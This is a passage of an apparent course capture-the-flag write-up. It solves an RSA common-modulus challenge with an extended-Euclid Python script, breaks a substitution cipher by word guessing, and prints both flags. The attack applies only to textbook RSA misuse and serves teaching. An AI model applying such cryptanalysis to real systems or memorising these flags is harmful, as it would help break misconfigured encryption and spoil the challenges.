I found that to find `a` and `b` I needed the Extended Euclidean Algorithm, which is a method that, given two numbers, returns their gcd along with the coefficients of "Bézout's identity". One of the two coefficients will be negative, which means we'd need to compute something like `c2^(-8) mod n`. To handle that, we just compute the modular inverse of `c2` first and then raise it to the positive exponent: `c2^(-8) mod n = (c2^(-1))^8 mod n`.

I wrote the following script to perform the full attack:

```python
from math import gcd

n  = 68763220499880382748061047793224480379306070011580192915102536795936025037114430141153463924324924720213374665527698947104867489722768305156185781397708597921961908756661955475211521521307420888953625254050884287836024907253813296969953089801311700224064985180533369189924847418860288812446594198027995006459
e1 = 17
c1 = 31639688759986380048872626922641355249537665412575301788333910070143398668717865747935662770435017556234625719812047152958009007826478981052431969434671493071192636090087709681040283208315026387109009653476451329609363511159332865283345433940793932257511835231587653017270650777299636136857736773154544648846
e2 = 65537
c2 = 61580015420465692431075852114885002068004255291733761336133288437467384904599495566508377344422977339499693955164823750818359455704383740301935114214613776988213130346740049060952981388336403765726258579476954914765225969801012296879038760848100464626749212464845152869738598057933742930614573801335202444982

# Extended Euclidean Algorithm
def egcd(a, b):
    if b == 0:
        return a, 1, 0
    g, x, y = egcd(b, a % b)
    return g, y, x - (a // b) * y

g, a, b = egcd(e1, e2)

# Handle negative exponents with modular inverse
if a < 0:
    c1 = pow(c1, -1, n)
    a = -a
if b < 0:
    c2 = pow(c2, -1, n)
    b = -b

m = (pow(c1, a, n) * pow(c2, b, n)) % n
flag = m.to_bytes((m.bit_length() + 7) // 8, 'big')
print(flag.decode())
```

Running it gave me the flag: 
```
fsuCTF{Not_CRT_But_Still_Vulnerable}
```


## Jumbled Mess
For this challenge we were only provided with a ciphered message:
```
druTGD{a_synl_pyu_she_h_oqlhg_gail_ax_yuq_tjhrr.hjj_yd_gsl_gh'r_she_hjyg_yd_dux_glhtsaxo_ag.ihpml_zl_zajj_rll_phjj_hqyuxe_ax_gsl_duguql}
```

The flag format should be `fsuCTF{...}`, and the flags usually contain readable text with words in l33t separated by underscores.

The first thing I noticed was that the ciphertext already had the structure of a flag: it started with something that looked like the flag prefix (`druTGD`) followed by text inside curly braces with underscores separating what looked like words. So the underscores, the curly braces and the dots were probably not part of the cipher and were already in their correct positions. This meant that only the letters were encrypted.

Since the flag format is `fsuCTF{...}`, I could directly compare the encrypted prefix with the real one to start figuring out the cipher:

```
Encrypted: d r u T G D
Real:      f s u C T F
```

This gave me the first letter mappings: `d->f`, `r->s`, `u->u`, `T->C`, `G->T`, `D->F`. Uppercase letters in the prefix mapped to uppercase letters in the real flag, and lowercase to lowercase. But since the rest of the ciphertext was mostly lowercase, I assumed the cipher was case-insensitive and the uppercase was only used for the "CTF" part of the prefix. So the effective mappings were: `d->f`, `r->s`, `u->u`, `g->t`, `d->f`.

At this point I was pretty sure this was a monoalphabetic substitution cipher, meaning each letter in the alphabet is replaced by another fixed letter.

To figure out the rest of the mappings I started looking at short, repeated words in the ciphertext, since those are easier to guess:

- `yd` appeared 3 times. A very common 2-letter English word ending in a letter that maps to `f`... that's `of`. So `y->o` and `d->f` (confirmed).
- `gsl` appeared 3 times. I already knew `g->t`, so this was `t _ _`. The most obvious word is `the`. So `s->h` and `l->e` (and `g->t` confirmed).
- `ax` appeared 3 times. A common 2-letter word... `in` fit well. So `a->i` and `x->n`.
- `hjj` - a 3-letter word with a double letter at the end. With `h` still unknown and `j` still unknown, a common word like `all` made sense. So `h->a` and `j->l`.

With these mappings I could partially decrypt the message and start reading fragments. For example, `she` decrypted to `had` (s->h, h->a, e->d), `gail` became `time` (g->t, a->i, i->m, l->e), and `oqlhg` became `great` (o->g, q->r, l->e, h->a, g->t).

I kept going word by word, using context to guess the remaining letters. For example:

- `synl` with known `y->o` became `_o_e`, which looked like `hope`. So `s->h` (already known) and `n->p`.
- `pyu` with known `y->o` and `u->u` became `_ou`, which is `you`. So `p->y`.
- `tjhrr` with known `j->l` and `h->a` became `_lass`, which is `class`. So `t->c`.
- `glhtsaxo` with several known letters became `teac_in_`, clearly `teaching`. So `t->c` (confirmed) and `o->g` (confirmed).

I wrote a simple Python script to apply all the mappings at once and see the full decrypted text:

```python
mapping = {
    'd': 'f', 'r': 's', 'u': 'u', 'g': 't', 'y': 'o',
    's': 'h', 'l': 'e', 'h': 'a', 'j': 'l', 'a': 'i',
    'x': 'n', 'n': 'p', 'p': 'y', 't': 'c', 'o': 'g',
    'q': 'r', 'i': 'm', 'e': 'd', 'z': 'w', 'm': 'b',
}

cipher = "druTGD{a_synl_pyu_she_h_oqlhg_gail_ax_yuq_tjhrr.hjj_yd_gsl_gh'r_she_hjyg_yd_dux_glhtsaxo_ag.ihpml_zl_zajj_rll_phjj_hqyuxe_ax_gsl_duguql}"

result = ""
for c in cipher:
    lower = c.lower()
    if lower in mapping:
        mapped = mapping[lower]
        result += mapped.upper() if c.isupper() else mapped
    else:
        result += c

print(result)
```

Running it gave me the full flag:

```
fsuCTF{i_hope_you_had_a_great_time_in_our_class.all_of_the_ta's_had_alot_of_fun_teaching_it.maybe_we_will_see_yall_around_in_the_future}
```
